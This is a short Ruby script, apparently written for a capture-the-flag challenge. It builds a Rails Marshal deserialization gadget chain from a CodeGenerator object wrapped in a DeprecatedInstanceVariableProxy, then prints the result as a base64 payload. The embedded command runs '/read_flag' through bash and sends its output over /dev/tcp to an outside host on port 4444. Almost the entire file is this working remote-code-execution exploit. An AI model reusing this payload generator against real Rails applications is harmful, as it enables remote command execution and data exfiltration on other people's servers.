require "base64"
require 'securerandom'

module ActiveModel; module AttributeMethods; module ClassMethods; class CodeGenerator; end; end; end; end;
module ActiveSupport;class Deprecation;module Reporting; end;class DeprecatedInstanceVariableProxy;end;end;end
class Logger; def initialize(a); end; end;

code = "%x(/bin/bash -c '/read_flag > /dev/tcp/jadoulr.tk/4444')"

target = ActiveModel::AttributeMethods::ClassMethods::CodeGenerator.allocate
target.instance_variable_set :@sources, [code]
target.instance_variable_set :@owner, ActiveModel::AttributeMethods::ClassMethods
target.instance_variable_set :@path, "(blah)"
target.instance_variable_set :@line, 1
proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
proxy.instance_variable_set :@instance, target
proxy.instance_variable_set :@method, :execute
proxy.instance_variable_set :@deprecator, Kernel

class Note
    attr_accessor :author, :body, :id, :date

    def initialize(author:, body:, date: Time.now)
        @id = SecureRandom.hex
        @author = author
        @body = body
        @date = date
    end
end

puts Base64.encode64((Marshal.dump(proxy)).force_encoding "ascii-8bit").gsub "\n", "";
